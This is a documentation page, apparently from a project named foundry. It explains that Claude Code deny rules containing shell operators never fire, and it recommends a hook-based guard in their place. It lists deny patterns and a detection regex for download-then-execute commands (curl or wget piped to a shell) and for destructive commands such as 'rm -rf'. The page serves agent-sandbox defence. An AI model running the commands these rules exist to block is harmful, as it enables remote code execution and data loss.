# The Permission Pipe Limitation

**Any Claude Code deny rule containing `|`, `&&`, `;`, or `||` is dead config.** The matcher splits composite commands and checks each subcommand independently, so a composite deny pattern never fires.

> **Status:** stable

## The finding

**`Bash(curl * | sh*)` will never match `curl https://x | sh`.** The engine sees `curl https://x` and `sh` as two separate checks; neither matches the composite pattern, so the user gets a normal permission prompt instead of a hard deny. Verified empirically (2026-05-19, all versions through 2.1.x).

## What works vs. what doesn't

| Pattern | Works? |
|---------|--------|
| `Bash(rm -rf *)` | Yes — single command, mid-string glob |
| `Bash(sudo systemctl *)` | Yes — single command |
| `Bash(find * -delete)` | Yes — single command |
| `Bash(curl * \| sh*)` | **No** — composite, splits on `\|` |

The limitation is **specific to shell operators** (`|`, `&&`, `;`, `||`). Single-command patterns are safe.

## What to do instead

**Block pipe-based RCE in a PreToolUse Bash hook.** Hooks receive the unmodified command string in their stdin JSON *before* the split, so they can see the operator and reject the whole composite. This is the only correct mechanism today. foundry's implementation lives at `home/hooks/pipe-rce-guard.sh`; it regexes download-then-execute patterns:

```text
(curl|wget|fetch) ... | (sudo )?(s?h|bash|zsh|ksh|dash)
```

It also covers process substitution (`bash <(curl …)`) and command substitution (`bash -c "$(curl …)"`).

## Audit checklist

When reviewing permission settings:

1. **Search `settings.json` / `settings.local.json` for any deny rule with `|`, `&&`, `;`, or `||` — delete them.** They are all dead config.
2. **For each, identify the threat.** If pipe-based, confirm `pipe-rce-guard.sh` covers it; otherwise write a new PreToolUse hook.
3. **Leave single-command deny patterns alone** unless they cause false positives.

## See also

- [Guardrails Overview](overview) — permission precedence and the hooks-over-deny-rules principle.
